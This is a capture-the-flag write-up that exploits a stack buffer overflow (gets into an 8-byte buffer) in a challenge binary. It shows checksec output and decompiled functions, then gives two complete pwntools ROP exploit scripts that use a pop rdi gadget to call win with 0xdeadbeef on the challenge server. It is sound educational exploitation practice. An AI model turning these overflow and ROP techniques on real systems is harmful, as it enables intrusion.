From the challenge name, we can assume that it has something to do with ROP.

The binary given to us is 64-bit LSB, not stripped, meaning we can read function names.
```
out: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e53c4d0a294188009beb3a2dd0296932846eb6a9, for GNU/Linux 3.2.0, not stripped
```

## Protections

First, we start with a `checksec`:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   42 Symbols        No    0               3            out
```


| Protection | Enabled | Usage |
| -------- | -------- | -------- |
| Canary     | ✘    | Prevent stack overflows     |
| NX     |✔    | Disables code execution on the stack     |
| PIE     | ✘    | Randomizes the binary's base address     |
| RelRO     | Partial    | Makes some sections of the binary read-only     |



Running the program, it simply takes in a user input. 

Decompiling the binary in ghidra, we have 3 functions of interest.

```c
undefined8 main(void)

{
  char local_10 [8];
  
  gets(local_10);
  return 0;
}
```
`main` reads in user input to an 8 byte buffer with `gets`.


```c
void gadget1(void)

{
  return;
}

```

`gadget1` just returns. We will be using this to construct our payload later.


```c
void win(long param_1)

{
  char flag [104];
  FILE *flag_fp;
  
  flag_fp = fopen("flag.txt","r");
  fgets(flag,0x23,flag_fp);
  printf("%i\n",param_1);
  if (param_1 == 0xdeadbeef) {
    puts(flag);
    fflush(stdout);
  }
  else {
    puts("Bad!");
  }
  return;
}
```
`win` prints out the flag if we pass in `0xdeadbeef` as its parameter.

## Constructing the payload
The approach here is to overwrite the input buffer, and use a gadget so that the program returns to the `win` function with `0xdeadbeef` as its parameter. Since this is a 64-bit binary, function parameters are passed to the stack through registers (`rdi`, `rsi`, `rdx`, etc.). So we will need to find a `pop rdi; ret`.

To find the offset, we use `gdb` and `cyclic`. We grab 8 bytes from the `rsp` to search for the pattern, which gives us 16.

We locate the address of `pop rdi` in `gadget1`.
```
0x000000000040117a <+4>:     pop    rdi
```

Then we locate the starting address of the `win` function.
```
0x000000000040117f <+0>:     push   rbp
```

The final payload will be offset + `pop rdi` + `0xdeadbeef` + `win`.

## Exploit
```py
from pwn import *

elf = ELF("./out")
context.binary = elf
context.log_level = "debug"

# io = elf.process()
io = remote("tjc.tf", 31457)

offset = 16
pop_rdi = 0x000000000040117a
win_addr = 0x000000000040117f

payload = flat({
	offset: [
		pop_rdi,
		0xdeadbeef,
		win_addr
		# elf.symbols.win
	]
	})

io.sendline(payload)
io.interactive()
```

You can also solve this more easily using the ROP tool.

```py
from pwn import *

elf = ELF("./out")
context.binary = elf
context.log_level = 'debug'

#io = elf.process()
io = remote("tjc.tf", 31457)
offset = 16

rop = ROP(elf)
rop.win(0xdeadbeef)

payload = flat({
    offset: rop.chain()
})

io.sendline(payload)
io.interactive()
```